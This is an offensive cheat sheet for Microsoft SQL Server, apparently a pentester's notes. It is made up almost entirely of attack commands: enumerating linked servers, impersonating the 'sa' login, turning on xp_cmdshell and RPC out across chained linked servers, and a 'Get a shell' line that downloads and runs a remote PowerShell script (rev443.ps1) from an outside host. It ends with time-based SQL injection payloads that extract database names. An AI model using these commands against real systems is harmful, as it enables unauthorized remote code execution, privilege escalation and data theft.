# MSSQL

## Commands

### Enumeration

```csharp
SELECT * from master..sysservers
```

```csharp
EXEC ('SELECT SUSER_NAME()');
```

#### List users

```csharp
SELECT name FROM sys.server_principals 
```

### Impersonate user

```csharp
EXECUTE AS LOGIN = 'sa';
```

### Check user context on remote servers

```csharp
EXEC ('SELECT SUSER_NAME()') AT "SQL2_SERVER";
```

### Execute remote commands

```csharp
SELECT * FROM OPENQUERY("SQL2_SERVER", 'select * from master..sysservers')
```

### Enable XP\_CMDSHELL on remote server

```csharp
EXECUTE ('EXEC sp_configure ''show advanced option'', ''1'';reconfigure;')  AT SQL2_SERVER
EXECUTE('sp_configure ''xp_cmdshell'',1;reconfigure;') AT "SQL2_SERVER";
```

### **Enable RPC out**

```csharp
EXECUTE ('EXEC SP_ServerOption ''SQL3_SERVER'',''RPC OUT'',TRUE') AT SQL2_SERVER
```

### DataLinks abuse

```csharp
EXECUTE ('EXEC SP_ServerOption ''SQL3_SERVER'',''RPC OUT'',TRUE') AT SQL2_SERVER
EXECUTE ('EXECUTE (''EXEC sp_configure ''''show advanced option'''',''''1'''';reconfigure;'') AT SQL3_SERVER') AT SQL2_SERVER
EXECUTE ('EXECUTE (''EXEC sp_configure ''''xp_cmdshell'''',''''1'''';reconfigure;'') AT SQL3_SERVER') AT SQL2_SERVER
EXECUTE ('EXECUTE (''EXEC xp_cmdshell EXECUTE ''''hostname'''';'') AT SQL3_SERVER') AT SQL2_SERVER
# Get a shell
EXECUTE ('EXECUTE (''EXEC xp_cmdshell ''''cmd /c powershell -c iex((new-object net.webclient).downloadstring(''''''''http://10.110.0.10/rev443.ps1''''''''))'''';'') AT SQL3_SERVER') AT SQL2_SERVER
```

## Injections

### Time Based

```csharp
uname=test';WAITFOR DELAY '0:0:5'--&psw=test
```

```csharp
test';IF(UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysdatabases WHERE name NOT IN (SELECT TOP 5 name FROM master..sysdatabases ORDER BY name) ORDER BY name),1,1))>1) WAITFOR DELAY '0:0:5'--
```

